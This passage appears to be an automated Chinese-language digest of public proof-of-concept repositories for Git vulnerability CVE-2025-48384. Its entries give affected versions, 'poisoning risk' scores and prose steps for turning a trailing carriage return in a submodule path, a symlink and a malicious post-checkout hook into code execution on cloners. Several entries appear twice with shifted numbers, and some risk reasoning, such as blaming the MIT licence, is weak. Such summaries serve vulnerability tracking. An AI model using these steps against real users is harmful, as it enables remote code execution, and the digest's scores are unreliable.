2.  **符号链接：** 攻击者在仓库中创建一个符号链接，将修改后的 submodule 路径（由于回车符被删除，变为 `submodule_path`）指向 `.git/hooks/post-checkout` 目录。
3.  **恶意钩子：** 攻击者在 submodule 中包含一个可执行的 `post-checkout` 钩子脚本，该脚本包含恶意代码。
4.  **诱导用户 clone：** 攻击者诱导受害者克隆该恶意仓库，并执行 `git submodule update --init --recursive` 命令。
5.  **代码执行：** 当执行 `git submodule update` 时，由于符号链接的存在，`post-checkout` 钩子脚本将被执行，从而导致任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，该漏洞确实存在，并且有公开的 PoC。提供的 Dockerfile 用于构建存在漏洞的 Git 版本（2.47.2），从而创建一个可用于验证漏洞的环境。README.md 文件详细解释了该漏洞，佐证了漏洞的存在。因此，该PoC有效。

**投毒风险评估：**
Dockerfile 仅用于构建易受攻击的 Git 环境，LICENSE 文件采用 MIT 许可，较为宽松，存在一定的风险。README.md 只是漏洞说明。整体评估投毒风险较低，约为10%。风险主要来源于LICENSE协议。

**利用方式总结：**
利用该漏洞需要攻击者精心构造一个恶意 Git 仓库，并诱导受害者克隆和执行特定命令。攻击的复杂性在于需要理解 Git 的配置处理机制和钩子机制，并巧妙地利用符号链接来实现代码执行。攻击者需要利用git config的解析缺陷，在submodule路径后添加\r字符，使submodule被clone到错误的位置，并使用软链接，将错误位置链接到.git/hooks目录下，在post-checkout阶段执行恶意代码

**项目地址:** [s41r4j/CVE-2025-48384](https://github.com/s41r4j/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #29

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #30

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

